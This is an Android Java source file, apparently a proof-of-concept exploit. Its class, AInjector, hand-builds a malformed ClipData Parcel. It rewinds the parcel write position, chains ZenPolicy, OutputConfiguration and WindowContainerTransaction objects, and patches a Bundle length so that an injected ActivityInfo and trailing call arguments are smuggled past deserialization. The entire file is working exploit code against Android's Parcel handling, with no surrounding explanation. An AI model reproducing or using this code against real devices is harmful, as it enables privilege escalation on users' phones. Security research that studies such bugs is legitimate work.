package com.example.intentdata2;

import android.annotation.SuppressLint;
import android.content.ClipData;
import android.content.pm.ActivityInfo;
import android.content.pm.PackageItemInfo;
import android.os.Bundle;
import android.os.Parcel;
import android.os.Parcelable;
import android.text.TextUtils;
import android.util.SparseArray;

import com.android.server.pm.PackageManagerException;

import java.io.Serializable;

@SuppressLint({"ParcelCreator", "ParcelClassLoader"})
public class AInjector implements Serializable, Parcelable {

    private static final int VAL_BUNDLE = 3;
    private static final int VAL_PARCELABLE = 4;
    private static final int VAL_SERIALIZABLE = 21;
    private static final int BUNDLE_MAGIC = 0x4C444E42; // 'B' 'N' 'D' 'L'

    private boolean mDetectRewind;
    private int mRewind;

    static ActivityInfo sInjectedInfo;

    public static ClipData createClipData() {
        Parcel parcel = Parcel.obtain();

        AInjector injector = new AInjector();
        injector.mRewind = doDetectRewind();

        parcel.writeString("android.content.ClipData");
        beginClipData(parcel);
        // splitDependencies SparseArray
        parcel.writeInt(1); // Number of key-value pairs
        parcel.writeInt(0); // Key
        parcel.writeInt(VAL_SERIALIZABLE); // Value type
        parcel.writeSerializable(injector);
        finishClipData(parcel);

        int a = parcel.dataPosition();
        parcel.writeInt(0);
        parcel.setDataPosition(0);
        ClipData clipData = parcel.readParcelable(null);
        int b = parcel.dataPosition();
        parcel.recycle();
        return clipData;
    }

    /**
     * Write to {@link Parcel} data for {@link ClipData} up to
     * (excluding) {@link android.content.pm.ApplicationInfo}{@code .splitDependencies}
     * which is written through {@link Parcel#writeSparseArray(SparseArray)} which uses
     * {@link Parcel#writeValue(Object)}.
     */
    private static void beginClipData(Parcel dest) {
        // Begin ClipData
        // Begin mClipDescription
        TextUtils.writeToParcel(null, dest, 0); // mLabel
        dest.writeStringArray(new String[0]); // mMimeTypes
        dest.writePersistableBundle(null); // mExtras
        dest.writeLong(0); // mTimeStamp
        dest.writeBoolean(false); // mIsStyledText
        dest.writeInt(0); // mClassificationStatus
        dest.writeBundle(new Bundle()); // mEntityConfidence
        // End mClipDescription
        dest.writeInt(0); // mIcon == null
        dest.writeInt(1); // mItems.size()
        // Begin mItems.get(0)
        TextUtils.writeToParcel(null, dest, 0); // mText
        dest.writeString(null); // mHtmlText
        dest.writeInt(0); // mIntent == null
        dest.writeInt(0); // mUri == null
        dest.writeInt(1); // mActivityInfo != null
        // Begin mActivityInfo
        // Begin ComponentInfo
        new PackageItemInfo().writeToParcel(dest, 0);
        // Begin ApplicationInfo
        dest.writeInt(0); // readSquashed offset==0 (not squashed)
        new PackageItemInfo().writeToParcel(dest, 0);
        dest.writeString(null); // taskAffinity
        dest.writeString(null); // permission
        dest.writeString(null); // processName
        dest.writeString(null); // className
        dest.writeInt(0); // theme
        dest.writeInt(0); // flags
        dest.writeInt(0); // privateFlags
        dest.writeInt(0); // privateFlagsExt // Since Android 12 Beta 2
        dest.writeInt(0); // requiresSmallestWidthDp
        dest.writeInt(0); // compatibleWidthLimitDp
        dest.writeInt(0); // largestWidthLimitDp
        dest.writeInt(0); // storageUuid == null
        dest.writeString(null); // scanSourceDir
        dest.writeString(null); // scanPublicSourceDir
        dest.writeString(null); // sourceDir
        dest.writeString(null); // publicSourceDir
        dest.writeStringArray(null); // splitNames
        dest.writeStringArray(null); // splitSourceDirs
        dest.writeStringArray(null); // splitPublicSourceDirs
    }

    /**
     * Continue writing {@link ClipData} started through {@link #beginClipData(Parcel)},
     * after writing {@link SparseArray} (which must be written by caller and isn't written
     * by neither {@link #beginClipData(Parcel)} nor this method.
     */
    private static void finishClipData(Parcel parcel) {
        parcel.writeString(null); // nativeLibraryDir
        parcel.writeString(null); // secondaryNativeLibraryDir
        parcel.writeString(null); // nativeLibraryRootDir
        parcel.writeInt(0); // nativeLibraryRootRequiresIsa
        parcel.writeString(null); // primaryCpuAbi
        parcel.writeString(null); // secondaryCpuAbi
        parcel.writeStringArray(null); // resourceDirs
        parcel.writeStringArray(null); // overlayPaths
        parcel.writeString(null); // seInfo
        parcel.writeString(null); // seInfoUser
        parcel.writeStringArray(null); // sharedLibraryFiles
        parcel.writeTypedList(null); // sharedLibraryInfos
        parcel.writeString(null); // dataDir
        parcel.writeString(null); // deviceProtectedDataDir
        parcel.writeString(null); // credentialProtectedDataDir
        parcel.writeInt(0); // uid
        parcel.writeInt(0); // minSdkVersion
        parcel.writeInt(0); // targetSdkVersion
        parcel.writeLong(0); // longVersionCode
        parcel.writeInt(0); // enabled
        parcel.writeInt(0); // enabledSetting
        parcel.writeInt(0); // installLocation
        parcel.writeString(null); // manageSpaceActivityName
        parcel.writeString(null); // backupAgentName
        parcel.writeInt(0); // descriptionRes
        parcel.writeInt(0); // uiOptions
        parcel.writeInt(0); // fullBackupContent
        parcel.writeInt(0); // dataExtractionRulesRes
        parcel.writeBoolean(false); // crossProfile
        parcel.writeInt(0); // networkSecurityConfigRes
        parcel.writeInt(0); // category
        parcel.writeInt(0); // targetSandboxVersion
        parcel.writeString(null); // classLoaderName
        parcel.writeStringArray(null); // splitClassLoaderNames
        parcel.writeInt(0); // compileSdkVersion
        parcel.writeString(null); // compileSdkVersionCodename
        parcel.writeString(null); // appComponentFactory
        parcel.writeInt(0); // iconRes
        parcel.writeInt(0); // roundIconRes
        parcel.writeInt(0); // mHiddenApiPolicy
        parcel.writeInt(0); // hiddenUntilInstalled
        parcel.writeString(null); // zygotePreloadName
        parcel.writeInt(0); // gwpAsanMode
        parcel.writeInt(0); // memtagMode
        parcel.writeInt(0); // nativeHeapZeroInit
        parcel.writeInt(0); // requestOptimizedExternalStorageAccess
        // End ApplicationInfo
        parcel.writeString(null); // processName
        parcel.writeString(null); // splitName
        parcel.writeStringArray(null); // attributionTags // Since Android 12 Beta 2
        parcel.writeInt(0); // descriptionRes
        parcel.writeInt(0); // enabled
        parcel.writeInt(0); // exported
        parcel.writeInt(0); // directBootAware
        // End ComponentInfo
        parcel.writeInt(0); // theme
        parcel.writeInt(0); // launchMode
        parcel.writeInt(0); // documentLaunchMode
        parcel.writeString(null); // permission
        parcel.writeString(null); // taskAffinity
        parcel.writeString(null); // targetActivity
        parcel.writeString(null); // launchToken
        parcel.writeInt(0); // flags
        parcel.writeInt(0); // privateFlags
        parcel.writeInt(0); // screenOrientation
        parcel.writeInt(0); // configChanges
        parcel.writeInt(0); // softInputMode
        parcel.writeInt(0); // uiOptions
        parcel.writeString(null); // parentActivityName
        parcel.writeInt(0); // persistableMode
        parcel.writeInt(0); // maxRecents
        parcel.writeInt(0); // lockTaskLaunchMode
        parcel.writeInt(0); // windowLayout == null
        parcel.writeInt(0); // resizeMode
        parcel.writeString(null); // requestedVrComponent
        parcel.writeInt(0); // rotationAnimation
        parcel.writeInt(0); // colorMode
        parcel.writeFloat(0); // mMaxAspectRatio
        parcel.writeFloat(0); // mMinAspectRatio
        parcel.writeBoolean(false); // supportsSizeChanges
        // parcel.writeStringArray(null); // attributionTags // Gone in Android 12 Beta 2
        // End mActivityInfo
        parcel.writeInt(0); // mTextLinks == null
        // End mItems.get(0)
        // End ClipData
    }

    /**
     * Detect number of bytes we need to go back with {@link Parcel#setDataPosition(int)}
     * in order to overwrite class name written previously by {@link Parcel#writeParcelable(Parcelable, int)}
     */
    private static int doDetectRewind() {
        AInjector injector = new AInjector();
        injector.mDetectRewind = true;
        Parcel parcel = Parcel.obtain();
        parcel.writeParcelable(injector, 0);
        parcel.recycle();
        return injector.mRewind;
    }

    @Override
    public int describeContents() {
        return 0;
    }

    @Override
    public void writeToParcel(Parcel dest, int flags) {
        if (mDetectRewind) {
            mRewind = dest.dataPosition();
            return;
        }
        dest.setDataPosition(dest.dataPosition() - mRewind);
        dest.writeString("android.service.notification.ZenPolicy");
        // Begin ZenPolicy
        dest.writeInt(0); // mPriorityCategories.size()
        dest.writeInt(1); // mVisualEffects.size()
        dest.writeInt(VAL_PARCELABLE);
        dest.writeString("android.hardware.camera2.params.OutputConfiguration");
        // Begin OutputConfiguration
        dest.writeInt(0); // mRotation
        dest.writeInt(0); // mSurfaceGroupId
        dest.writeInt(0); // mSurfaceType
        dest.writeInt(0); // mConfiguredSize.mWidth
        dest.writeInt(0); // mConfiguredSize.mHeight
        dest.writeInt(0); // mIsDeferredConfig
        dest.writeInt(0); // mIsShared
        dest.writeInt(0); // mSurfaces.size()
        dest.writeString(null); // mPhysicalCameraId
        dest.writeInt(0); // mIsMultiResolution
        dest.writeInt(2); // mSensorPixelModesUsed.size()
        // Begin mSensorPixelModesUsed.get(0)
        dest.writeInt(VAL_PARCELABLE);
        dest.writeString("android.window.WindowContainerTransaction");
        dest.writeInt(0); // mChanges.size()
        dest.writeInt(1); // mHierarchyOps.size()
        dest.writeInt(VAL_SERIALIZABLE);
        dest.writeSerializable(new PackageManagerException());
        // End mSensorPixelModesUsed.get(0)
        // Begin mSensorPixelModesUsed.get(1)
        dest.writeInt(VAL_BUNDLE);
        int bundleLengthPos = dest.dataPosition();
        dest.writeInt(0); // Will hold length
        dest.writeInt(BUNDLE_MAGIC);
        int bundleStartPos = dest.dataPosition();
        writeFinalPayload(dest);
        int bundleEndPos = dest.dataPosition();
        // Begin Patch bundle size
        dest.setDataPosition(bundleLengthPos);
        dest.writeInt(bundleEndPos - bundleStartPos);
        dest.setDataPosition(bundleEndPos);
        // End Patch bundle size
        // End mSensorPixelModesUsed.get(1)
        // End OutputConfiguration
        dest.writeInt(0); // mPriorityCalls
        dest.writeInt(0); // mPriorityMessages
        dest.writeInt(0); // mConversationSenders
        // End ZenPolicy
    }

    private void writeFinalPayload(Parcel dest) {
        // Finish ClipData
        finishClipData(dest);
        // Finish Intent
        dest.writeInt(0); // mContentUserHint
        dest.writeBundle(null); // mExtras

        // in ActivityInfo info
        dest.writeInt(1); // != null
        sInjectedInfo.writeToParcel(dest, 0);

        // in CompatibilityInfo compatInfo
        dest.writeInt(0); // == null

        // int resultCode
        dest.writeInt(0); // == null
        // in String data
        dest.writeString(null);
        // in Bundle extras
        dest.writeInt(0); // == null
        // boolean sync
        dest.writeInt(0); // false
        // int sendingUser
        dest.writeInt(0);
        // int processState
        dest.writeInt(0);
    }
}
